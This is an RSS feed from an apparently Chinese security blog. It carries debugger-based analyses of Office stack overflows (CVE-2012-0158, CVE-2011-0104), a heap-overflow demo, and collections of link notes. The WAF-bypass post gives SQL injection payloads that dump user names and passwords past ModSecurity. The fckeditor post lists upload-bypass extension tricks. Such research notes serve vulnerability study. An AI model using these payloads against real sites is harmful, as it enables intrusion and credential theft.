<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>/</link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Wed, 17 Aug 2016 13:56:12 +0800</pubDate>
    <lastBuildDate>Wed, 17 Aug 2016 13:56:12 +0800</lastBuildDate>
    <generator>Jekyll v3.1.6</generator>
    
      <item>
        <title>漏洞战争-cve-2010-2553</title>
        <description>&lt;h3 id=&quot;x00-&quot;&gt;0x00 堆溢出基础知识&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;good link:
    http://blog.csdn.net/ithzhang/article/details/12711431
    http://www.mottoin.com/87277.html
    http://www.voidcn.com/blog/u010797814/article/p-3924286.html

堆表只索引所有的空闲态堆块,已分配|占用的堆块由使用它的程序索引,空闲态堆块和占用态堆块:

    堆块使用_HEAP_ENTYR结构来描述,该结构占8Byte. _HEAP_ENTRY结构之后就是供应用程序使用的区域.调用HeapAlloc函数
    将返回HEAP_ENTRY之后的地址.此地址减去8Byte便可以得到_HEAP_ENTRY结构.对于已经释放的堆块,堆管理器定义了
    _HEAP_ FREE_ENTRY结构来描述.该结构的前八个字节与_HEAP_ENTRY结构完全相同.但增加了8个字节来存储空闲链表的头节点.
    如下图：
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-1.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;堆溢出实质:
    [flink+4]=blink
    [blink]=flink

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-&quot;&gt;0x01 堆溢出原理&lt;/h3&gt;

&lt;h4 id=&quot;day2&quot;&gt;1&amp;gt;0day2实例&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;section&quot;&gt;2&amp;gt;漏洞战争实例&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;------------------heapoverflow.c---------------------
#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
    HANDLE hHeap;
    char *heap;
    char str[]=&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;
    hHeap=HeapCreate(HEAP_GENERATE_EXCEPTIONS,0x1000,0xffff);
    getchar();

    heap=HeapAlloc(hHeap,0,0x10);
    printf(&quot;heap addr:0x%08x\n&quot;,heap);

    strcpy(heap,str);
    HeapFree(hHeap,0,heap);

    HeapDestroy(hHeap);
    return 0;
}
------------------------end--------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 17 Aug 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/17/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-2553/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/17/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-2553/</guid>
        
        <category>漏洞战争</category>
        
        <category>漏洞分析</category>
        
        <category>堆溢出</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2012-0158</title>
        <description>&lt;h3 id=&quot;x00-about&quot;&gt;0x00 about&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;实验环境:
    windows xp sp3
    office word 2003 sp3
    offvis1.1
漏洞描述:
    MSCOMCTL.OCX中存在栈溢出漏洞
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-&quot;&gt;0x01 相关技巧&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;poc.doc是rtf格式,里面的ole数据以文本形式存储,offvis无法识别,导致不能通过offvis分析doc的结构,可通过winhex将
0xD0CF11E0开始至结尾的所有看上去是十六进制形式表示的文本数据保存为真正的十六进制值,最后有三个右大括号不属于十六
进制形式,也即将下面图1中poc.doc转成图2中的test.doc
    操作步骤:
    1&amp;gt;winhex打开poc.doc,选中text区中的D0CF11E0到最后的0000(左边为hex区,右边为text区)
    2&amp;gt;单击右键选择edit|copy block|normally
    3&amp;gt;新建一个空白文件,20k大小(15k应该也够了)
    4&amp;gt;在新建文件的offset为0处右键选择edit|copyboard data|paste,在弹出的对话框中选择最后一种粘贴方式,并保存为
    test.doc
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;图1
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图2
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-2.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2&amp;gt;offvis相关分析中,打开重新生成的test.doc,在分析模块中选择最后一个,如下图3所示,41414141对应的数据在offvis分析
中的对应字段如下图4中所示
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图3
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图4
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-4.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x02-&quot;&gt;0x02 调试分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;打开word,od附加,在word中打开poc.doc,弹出出错框,错误地址为41414141,用上面的方法通过offvis分析找到对应字段为
Data,或者直接双击打开poc.doc,也是直接弹出出错对话框,od没有在eip=0x41414141时捕获异常,但是immunity debugger能够
在eip=0x41414141处中断并退出,可达到和windbg一样的效果(在cve-2011-0104的分析中,windbg可捕获到eip为一个正常地址
时对应的汇编指令为正常的汇编指令,但是该指令中访问了异常内存数据,而这里的情况是eip=41414141,是一个不正常的地址,
这里面没有指令),与此同时,od附加exe时会被系统异常处理程序先捕获eip=0x41414141这个异常,对比od和immunity debugger,
发现od中的调试选项中的异常默认处理情况如下图5,immunity debugger如图6
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;图5
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图6
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-6.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;尝试将od的选项设置成和immunity debugger一样,依然会弹出如下图7中的系统异常对话框,看来od在捕获异常的功能上不如
immunity debugger
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图7
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2012-0158-7.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;重新选择immunity debugger附加打开的word.exe,word.exe打开poc.doc,immunity debugger捕获到word.exe崩溃并得到崩溃时
的数据如下:(esp=121468,ebp=00000000,eip=41414141)

    ------------------寄存器窗口中--------------------
        EAX 00000000
        ECX 7C93003D ntdll.7C93003D
        EDX 00140608
        EBX 09FB0810
        ESP 00121468
        EBP 00000000
        ESI 002100B4
        EDI 00000000
        EIP 41414141
        C 0  ES 0023 32bit 0(FFFFFFFF)
        P 1  CS 001B 32bit 0(FFFFFFFF)
        A 0  SS 0023 32bit 0(FFFFFFFF)
        Z 1  DS 0023 32bit 0(FFFFFFFF)
        S 0  FS 003B 32bit 7FFDE000(FFF)
        T 0  GS 0000 NULL
        D 0
        O 0  LastErr ERROR_SUCCESS (00000000)
        EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
        ST0 empty
        ST1 empty
        ST2 empty
        ST3 empty
        ST4 empty
        ST5 empty
        ST6 empty
        ST7 empty
                       3 2 1 0      E S P U O Z D I
        FST 4000  Cond 1 0 0 0  Err 0 0 0 0 0 0 0 0  (EQ)
        FCW 127F  Prec NEAR,53  Mask    1 1 1 1 1 1
    ---------------------end--------------------------
    
    -------------------------堆栈窗口中-----------------------------
    001213EC   00000001  ...
    001213F0   0012F904  ?.
    001213F4   7C92E900  .閽|   ntdll.7C92E900
    001213F8   7C930040  @.搢   ntdll.7C930040
    001213FC   FFFFFFFF  
    00121400   7C93003D  =.搢   ntdll.7C93003D
    00121404   275C8800  .圽&#39;   MSCOMCTL.275C8800
    00121408   00140000  ...
    0012140C   00000000  ....
    00121410   08D9B008  百
    00121414   00000000  ....
    00121418   002100B4  ?!.
    0012141C   09FB0810  ?
    00121420   00008282  倐..
    00121424   00121458  X.
    00121428   275C8A0A  .奬&#39;   MSCOMCTL.275C8A0A
    0012142C   00121450  P.
    00121430   08D9B008  百
    00121434   00008282  倐..
    00121438   00000000  ....
    0012143C   002100B4  ?!.
    00121440   09FB0810  ?
    00121444   6A626F43  Cobj
    00121448   00000064  d...
    0012144C   00008282  倐..
    00121450   00000000  ....
    00121454   00000000  ....
    00121458   00000000  ....
    0012145C   41414141  AAAA
    00121460   00000000  ....
    00121464   00000000  ....
    00121468   00000000  ....  ------&amp;gt;   &amp;lt;崩溃时esp的值为121468&amp;gt;
    0012146C   00000000  ....
    00121470   00000000  ....
    00121474   00000000  ....
    00121478   00000000  ....
    0012147C   00000000  ....
    00121480   00000000  ....
    00121484   00000000  ....
    00121488   00000000  ....
    0012148C   00000000  ....
    00121490   00000000  ....
    00121494   00000000  ....
    00121498   00000000  ....
    0012149C   00000000  ....
    001214A0   00000000  ....
    001214A4   00000000  ....
    001214A8   00000000  ....
    001214AC   00000000  ....
    001214B0   00000000  ....
    001214B4   00000000  ....
    001214B8   00000000  ....
    001214BC   00000000  ....
    001214C0   00000000  ....
    001214C4   00000000  ....
    001214C8   00000000  ....
    ----------------------------end---------------------------------
    
    esp上面最近的一个返回地址为121428处的275c8a0a,尝试在275c8a0a处单独下断,无法直接下断,需要单独打开
    MSCOMCTL.ocx,执行命令:bp 0x275c8a0a,单独打开c:\windows\system32\MSCOMCTL.ocx,ctrl+g:275c8a0a,具体指令如下:

    -----------------275c8a0a附近----------------
    275C89C7   $  55            push ebp    ---------&amp;gt;函数入口点
    275C89C8   .  8BEC          mov ebp,esp
    275C89CA   .  83EC 14       sub esp,0x14
    275C89CD   .  53            push ebx                                 ;  MSCOMCTL.&amp;lt;ModuleEntryPoint&amp;gt;
    275C89CE   .  8B5D 0C       mov ebx,dword ptr ss:[ebp+0xC]           ;  MSCOMCTL.27580000
    275C89D1   .  56            push esi
    275C89D2   .  57            push edi
    275C89D3   .  6A 0C         push 0xC
    275C89D5   .  8D45 EC       lea eax,dword ptr ss:[ebp-0x14]
    275C89D8   .  53            push ebx                                 ;  MSCOMCTL.&amp;lt;ModuleEntryPoint&amp;gt;
    275C89D9   .  50            push eax
    275C89DA   .  E8 8EFDFFFF   call MSCOMCTL.275C876D
    275C89DF   .  83C4 0C       add esp,0xC
    275C89E2   .  85C0          test eax,eax
    275C89E4   .  7C 6C         jl short MSCOMCTL.275C8A52
    275C89E6   .  817D EC 436F6&amp;gt;cmp dword ptr ss:[ebp-0x14],0x6A626F43
    275C89ED   .  0F85 92A60000 jnz MSCOMCTL.275D3085
    275C89F3   .  837D F4 08    cmp dword ptr ss:[ebp-0xC],0x8
    275C89F7   .  0F82 88A60000 jb MSCOMCTL.275D3085
    275C89FD   .  FF75 F4       push dword ptr ss:[ebp-0xC]              ;  MSCOMCTL.&amp;lt;ModuleEntryPoint&amp;gt;
    275C8A00   .  8D45 F8       lea eax,dword ptr ss:[ebp-0x8]
    275C8A03   .  53            push ebx                                 ;  MSCOMCTL.&amp;lt;ModuleEntryPoint&amp;gt;
    275C8A04   .  50            push eax
    275C8A05   .  E8 63FDFFFF   call MSCOMCTL.275C876D
    275C8A0A   .  8BF0          mov esi,eax
    --------------------end----------------------

    也即275c8a0a处是一个返回地址(od和immunity debugger的堆栈窗口中显示形如module.xxxxxxxx为某个模块的某个地址的
    地方,大多数情况都是函数返回地址,也即在汇编窗口中对应为某条call ...指令的下一句的地址,有少数不是返回地址)
    且275c8a0a在函数275c89c7中,bp 0x275c8a0a后重新加载word.exe,并用word.exe打开poc.doc,成功在275c8a0a处中断
    ,对应数据如下:

    -------------------eip--------------------
    275C8A05   .  E8 63FDFFFF   call MSCOMCTL.275C876D
    275C8A0A   .  8BF0          mov esi,eax   ----&amp;gt;eip
    -------------------end--------------------

    -------------------堆栈窗口------------------
    00121428   275C8A0A  MSCOMCTL.275C8A0A
    0012142C   00121450          -----------&amp;gt;esp
    00121430   08D9A008
    00121434   00008282
    00121438   00000000
    0012143C   002100FC
    00121440   09FC0810
    00121444   6A626F43
    00121448   00000064
    0012144C   00008282
    00121450   00000000
    00121454   00000000
    00121458   00000000         ------------&amp;gt;ebp
    0012145C   41414141
    00121460   00000000
    00121464   00000000
    00121468   00000000
    ---------------------end---------------------

单步到275c8a56处的retn 0x8处时,eip=275C8A56,esp=12145c,[esp]=41414141

    ---------------汇编窗口------------
    275C8A50   &amp;gt;  8BC6          mov eax,esi
    275C8A52   &amp;gt; |5F            pop edi
    275C8A53   . |5E            pop esi
    275C8A54   . |5B            pop ebx
    275C8A55   . |C9            leave
    275C8A56   . |C2 0800       retn 0x8    ---&amp;gt; eip=275c8a56
    ------------------end--------------
    
    -------------堆栈窗口---------------
    00121428   275C8A0A  MSCOMCTL.275C8A0A
    0012142C   00121450
    00121430   08D9A008
    00121434   00008282
    00121438   00000000
    0012143C   002100FC
    00121440   09FC0810
    00121444   6A626F43
    00121448   00000064
    0012144C   00008282
    00121450   00000000
    00121454   00000000
    00121458   00000000
    0012145C   41414141   ---&amp;gt; esp=12145c
    00121460   00000000
    00121464   00000000
    00121468   00000000
    ---------------end------------------

再单步程序将跑飞到41414141处执行,并无法继续调试

这里分析的方法采用的是根据程序崩溃时堆栈窗口中在崩溃时的esp上方位置的函数返回地址回溯,此例中根据程序崩溃时的esp
上方(addr&amp;lt;esp,addr=121428,esp=121468)的121428处的返回地址275C8A0A回溯到275c8a0a处下断点,275c8a0a处于函数
275C89C7中.

根据崩溃时堆栈窗口中的esp上方的位置的函数返回地址回溯(也即崩溃时esp上方的位置[addr&amp;lt;esp]附近可以找到某
函数返回地址,就像这个例子一样),说明esp上方的函数返回地址已正常经执行(rent完)才去执行到当前崩溃时的esp对应eip的
地方,这样说明崩溃时esp上方的某函数返回地址的值与崩溃时的esp对应的刚执行完的eip(执行本例eip=41414141之前一步的
eip=275C8A56[对应rent 0x8])在汇编窗口中属于同一帧函数中,且某函数返回地址&amp;lt;该eip(本例中为275c8a56),这种情况可以直
接在崩溃时的esp上方的某函数返回地址在汇编窗口中跟随后的下断点,然后单步执行就能看到错误在哪里发生.

一般情况下，retn被覆盖
a.通常是当前函数帧中的一处子函数调用(形如call 子函数)导致当前函数的的返回地址被覆盖

或者说成是

b.当前函数中（子函数中）一处数据复制指令（形如resp ...)导致上一帧函数的返回地址被覆盖

a中的子函数中包括b中的复制指令,b中的上一帧函数对应a中的当前函数,此例中对应情况如下：

---------------------start------------------------
275e7004    push ebp
...
...
275e7015    call 275c89c7
275e701a


                        275c89c7    push ebp
                        ...
                        ...
                        275C8A05    call 275c876d
                        275c8a0a
                        ...
                        ...
                        275c8a56    retn 0x8
----------------------end-------------------------

275c8a05处的call 275c876d执行完后将覆盖栈中的275e701a为41414141,使得275c8a56处的retn 0x8返回到41414141处执行
在f7跟进275c8a05处的275c876d时，堆栈窗口中数据如下:

-------------start--------------
00121428  |275C8A0A  返回到 MSCOMCTL.275C8A0A 来自 MSCOMCTL.275C876D
0012142C  |00121450
00121430  |09FC0810
00121434  |00008282
00121438  |00000000
0012143C  |00210ECC
00121440  |09FC0810
00121444  |6A626F43
00121448  |00000064
0012144C  |00008282
00121450  |00210FB8
00121454  |275859E4  返回到 MSCOMCTL.275859E4 来自 MSCOMCTL.27585BBA
00121458  ]00121480
0012145C  |275E701A  返回到 MSCOMCTL.275E701A 来自 MSCOMCTL.275C89C7
00121460  |00210ECC
00121464  |09FC0810
00121468  |00000000
0012146C  |00210EA8
00121470  |08C992F0
00121474  |275AC296  返回到 MSCOMCTL.275AC296 来自 MSCOMCTL.275AC3AC
--------------end---------------
按理来讲，由于进入到275c876d函数帧中时栈中数据如上所示，一般情况下是在275c876d函数中执行到retn语句前,275c876d中
的其他指令会覆盖堆栈窗口中的离00121428处的275c8a0a最近的下面的一个返回地址，也即121454处的275859e4,因为从堆栈窗
口中看，进入275c876d函数之后，下面最近的返回地址将是返回到275c8a0a之后在当前275c876d函数的上一帧函数中的retn指
令将要返回的地址，也即从堆栈窗口中来看，275c8a56处的retn 0x8应该是要返回到121454处的275859e4,但是实际上并不是这
样，实际是275c8a56处的retn 0x8将要返回到上面堆栈窗口中的离121428处的275c8a0a下面第二近的12145c处的275e701a,因为
在275c89c7函数帧中开头一般会有一个抬高栈空间的动作（sub esp,0x..),这个抬高动作正好把00121454中的275859e4“拉进”
了275c89c7函数帧的栈空间，也即121454处的275859e4返回地址属于之前没有执行275c89c7的“无意义残余数据”,从这里看出，
以后不能看到堆栈窗口中下面最近的返回地址将要首先返回，并不一定，还有的可能是最近的返回地址并不是“有意义的返回地
址”,而是之前残余的数据,这样就要看第二个，或者第三个靠近的返回地址了
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 14 Aug 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/14/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0158/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/14/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0158/</guid>
        
        <category>漏洞分析</category>
        
        <category>漏洞战争</category>
        
        <category>栈溢出</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>waf绕过技巧库</title>
        <description>&lt;h3 id=&quot;x00-links&quot;&gt;0x00 links&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;waf绕过技巧库:
http://wafbypass.me/w/index.php/Main_Page  may be a best one```
http://www.freebuf.com/articles/web/10099.html   WAF绕过的奇技淫巧
http://tech-technical.com/index.php/2015/11/11/waf-bypass-sql-injection-tutorial/ 老外的技巧
http://webvuln.blogspot.hk/2015_04_01_archive.html 测试fuzz
http://www.wooyun.org/bugs/wooyun-2014-089426　　good
https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=9133  90sec新思路
http://www.idiot-attacker.com/2016/02/macam-macam-kode-bypass-waf.html good
http://wooyun.org/bugs/wooyun-2010-0121291
http://wooyun.org/bugs/wooyun-2010-0115175 fuzz2bypass
http://drops.wooyun.org/tips/7883 
http://www.securityidiots.com/Web-Pentest/WAF-Bypass/
http://www.pentest.net.cn/post/7
http://www.mottoin.com/86886.html
http://mp.weixin.qq.com/s?__biz=MzIyNjQzMjcyNw==&amp;amp;mid=2247483860&amp;amp;idx=1&amp;amp;sn=fa19f02e29d25f5f6852af27451ae4a9&amp;amp;scene=23&amp;amp;srcid=0815JYA53l0Bk3PMkhzRlKUh#rd
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-bypassed&quot;&gt;0x01 bypassed&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;modsecurity
id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e),version(),5,6,7,8 from `information_schema`.schemata*/--
id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(column_name as char))),0x27,0x7e),version(),5,6,7,8 from `information_schema`.columns where table_name=0x75736572*/--
id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(name as char))),0x3a,unhex(Hex(cast(password as char))),0x27,0x7e),version(),5,6,7,8 from user*/--
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 12 Aug 2016 00:00:00 +0800</pubDate>
        <link>/web/2016/08/12/waf%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%BA%93/</link>
        <guid isPermaLink="true">/web/2016/08/12/waf%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%BA%93/</guid>
        
        <category>waf</category>
        
        <category>bypass</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>fckeditor各版本绕过</title>
        <description>&lt;h3 id=&quot;x00-fckeditor&quot;&gt;0x00 fckeditor上传漏洞总结&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://sec.chinabyte.com/206/13708206.shtml
http://www.cnbraid.com/2015/07/09/fckeditor/
http://www.it610.com/article/1842939.htm
http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf &amp;lt;=2.6.4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-asp&quot;&gt;0x01 asp&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;=2.6.4
    http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf
2.6.6
    http://www.hack80.com/thread-320-1-1.html
    http://www.qhwins.com/ShowNews/?11-20109214030542523.html
2.6.8
    http://www.freebuf.com/vuls/6408.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-php&quot;&gt;0x02 php&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;=2.6.4
    http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-fckeditor&quot;&gt;0x03 fckeditor经典尝试后缀&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;将后缀改成.php.pjpg
2&amp;gt;将后缀改成.html
3&amp;gt;将后缀改成.lnk
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x04-&quot;&gt;0x04 其它上传技巧&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;上传时,延迟一下再上传,有时能bypass admin,用到firefox tamper插件
    https://www.youtube.com/watch?v=6hJ-d2NYLBg
2&amp;gt;双文件上传

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Fri, 12 Aug 2016 00:00:00 +0800</pubDate>
        <link>/web/2016/08/12/fckeditor%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</link>
        <guid isPermaLink="true">/web/2016/08/12/fckeditor%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</guid>
        
        <category>fckeditor</category>
        
        <category>web</category>
        
        <category>upload</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2011-0104</title>
        <description>&lt;h3 id=&quot;x00-about&quot;&gt;0x00 about&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;目标:分析cve-2011-0104
漏洞:excel TOOLBARDEF Record栈溢出漏洞
good article:
    http://m.2cto.com/Article/201112/114614.html
实验环境:
    excel 2003 sp3
    windows 2003 sp2 32位
漏洞触发样本:
    https://github.com/riusksk/vul_wars/raw/master/%E4%B9%A6%E7%B1%8D%E9%85%8D%E5%A5%97%E8%B5%84%E6%96%99.zip
    中的exploit.xlb

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-windbg&quot;&gt;0x01 windbg知识&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    http://www.yiiyee.cn/Blog/windbg/
    http://www.cppblog.com/weiym/archive/2012/06/07/177958.aspx

    db esi:查看esi地址中的内容
        db 400000:查看0x400000处的内容,db按字节大小查看,dd按DWORD类型查看
    !address edi:显示edi地址处的内存状态,信息
    lmm mso v:匹配mso模块,并显示详细信息
    bp eax:在eax处下断点,支持第几次经过后中断,支持中断后执行命令
    g:让被调试的程序继续运行(f5)
        gh:把异常标识为已处理并断续执行程序
        go:对异常不进行任何处理并继续执行程序
    kb:显示传递给堆栈回溯中的每个函数的前三个参数
        kp:显示传递给堆栈回溯中的每个函数的所有参数
    ub mso!Ordinal1273+0x2581:反汇编mso!Ordinal1273+0x2581地址之前的代码
        uf test!main:反汇编test!main函数
    p:单步步入step into(f11)
    t:单步步过step over(f10)
    ? ebp-edi:显示表达式ebp-edi的值
        ?? expression:显示c++表达式的值
    .cls:清屏

    其中windbg中的kb命令相当于od中的查看调用堆栈(alt+k),如下图中的ChildEBP列为当前eip对应的ebp的值,RetAddr为当
    前eip所在的函数的函数返回地址,Args to Child为当前函数的参数
    要注意的是,并不是kb下面的所有的ChildEBP对应的一列都是函数调用,只有第一排的ChildEBP,RetAddr,Args to
    Child的数据值是当前的函数调用的相关参数,从第二排开始的只是栈中高地址的数据内容从ebp到retn到参数相当于地址从

    一般情况下,栈空间中的低地址向高地址的排列,函数调用时,栈中的数据如下:

                    ...
                    ...    (new ebp为当前函数帧中的新的ebp,此处的new ebp代表当前函数帧的ebp的位置所在)
        new ebp --&amp;gt; old ebp(old ebp为上一函数帧的ebp,此处的old ebp代表new ebp位置中的内容值)
                    retn   (retn为当前函数的返回地址)
                    arg1   (arg1为当前函数的第一个参数)
                    arg2   (arg2为当前函数的第二个参数)
                    ...

    也即当前ebp中存放的是上一函数帧的ebp,且当前ebp的下一栈单元的内容为当前函数的retn地址
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/windbg_kb.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x02-&quot;&gt;0x02 调试过程&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;运行excel
运行windbg
    f6加载excel
    g
excel中打开exploit.xbl
windbg中发现excel异常,结果如下:

    ---------------violation--------------
    (f88.f34): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=51455047 ebx=0013ca48 ecx=00000006 edx=000014a8 esi=00000000 edi=00000400
    eip=300e06f7 esp=0013aa04 ebp=0013aa70 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Microsoft Office\OFFICE11\EXCEL.EXE - 
    EXCEL!Ordinal41+0xe06f7:
    300e06f7 8908            mov     dword ptr [eax],ecx  ds:0023:51455047=????????
    -----------------end------------------
    
    windbg捕获excel崩溃关键信息eip=300e06f7,开始要用windbg加载excel,不能用od加载,因为od不能捕获到这个开始的崩
    溃信息,kb还可查看崩溃时的函数调用情况,如下
    kb(可查看调用堆栈)
    --------------kb---------------
    ChildEBP RetAddr  Args to Child              
    WARNING: Stack unwind information not available. Following frames may be wrong.
    0013aa70 584b4c4b 30435451 50453043 55514b4c EXCEL!Ordinal41+0xe06f7
    0013aa74 30435451 50453043 55514b4c 4b4c4c47 0x584b4c4b
    0013aa78 50453043 55514b4c 4b4c4c47 35434c43 EXCEL!Ordinal41+0x435451
    --------------end--------------

关闭excel,windbg
重新在od中打开,并加载excel

in od:
    f9
    ctrl+g:300e06f7
    在300e06f7处往上找到当前函数帧的第一句push ebp,mov mov ebp,esp,并在push ebp上(addr=300e05ad)下断

excel打开exploit.xbl

in od:
od中断到300e05ad处
f8
f8
在汇编窗口中ctrl+g:ebp(此时ebp=12aa70)
右键在ebp的地址处下内存写入断点
    内存写入断点无法通过ctrl+b查看,只有在中断时状态栏会显示.在进入300e05ad之后再在该函数的ebp上下内存写入
    断点这样就可以很快定位出是哪句汇编指令在操作数据时会覆盖ebp(覆盖ebp也即会对ebp有写入操作),由上面ebp和
